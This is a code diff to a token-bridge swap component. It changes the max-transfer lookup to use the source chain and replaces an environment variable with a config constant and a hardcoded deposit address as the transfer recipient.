@@ -54,7 +54,7 @@ import {
   getSourceChainName,
   getGasToTransfer,
 } from '../../../services/umbria/fetchers/service'
-import { NETWORK_LABEL } from '../../../config/networks'
+import { BRIDGE_ADDRESS_DEFAULT, BRIDGE_PAIRS, NETWORK_LABEL } from '../../../config/networks'
 import { useTransactionAdder } from '../../../state/transactions/hooks'
 import { ERC20_BYTES32_ABI } from '../../../constants/abis/erc20'
 
@@ -270,7 +270,7 @@ export default function Swap() {
           }
 
           getGasToTransfer(getDestinationChainName(), currencies.INPUT.symbol).then((res) => {
-            getMaxAssetBridge(getDestinationChainName(), wrappedNativeAssetAddress).then((maxTransfer) => {
+            getMaxAssetBridge(getSourceChainName(), wrappedNativeAssetAddress).then((maxTransfer) => {
               if (parseFloat(res.costToTransfer) >= formattedAmounts[Field.INPUT]) {
                 setSwapState({
                   attemptingTxn: false,
@@ -282,7 +282,7 @@ export default function Swap() {
                 library
                   .getSigner()
                   .sendTransaction({
-                    to: process.env.BRIDGE_URL,
+                    to: BRIDGE_ADDRESS_DEFAULT,
                     value: formattedAmounts[Field.INPUT].toBigNumber(),
                   })
                   .then((res) => {
@@ -315,7 +315,7 @@ export default function Swap() {
 
       getAvailability().then((res) => {
         if (res) {
-          getMaxAssetBridge(getDestinationChainName(), inputCurr.address).then((maxTransfer) => {
+          getMaxAssetBridge(getSourceChainName(), inputCurr.address).then((maxTransfer) => {
             let walletSigner = library.getSigner()
             let provider = library.provider
 
@@ -326,15 +326,19 @@ export default function Swap() {
 
             let numberOfTokens = formattedAmounts[Field.INPUT]
 
+            console.log(maxTransfer)
+
             if (parseFloat(formattedAmounts[Field.INPUT]) <= maxTransfer) {
-              contract.transfer(process.env.BRIDGE_URL, numberOfTokens.toBigNumber()).then((transferResult) => {
-                setSwapState({
-                  attemptingTxn: true,
-                  showConfirm,
-                  swapErrorMessage: undefined,
-                  txHash: transferResult.hash,
+              contract
+                .transfer('0x4103c267Fba03A1Df4fe84Bc28092d629Fa3f422', numberOfTokens.toBigNumber())
+                .then((transferResult) => {
+                  setSwapState({
+                    attemptingTxn: true,
+                    showConfirm,
+                    swapErrorMessage: undefined,
+                    txHash: transferResult.hash,
+                  })
                 })
-              })
             } else {
               setSwapState({
                 attemptingTxn: false,
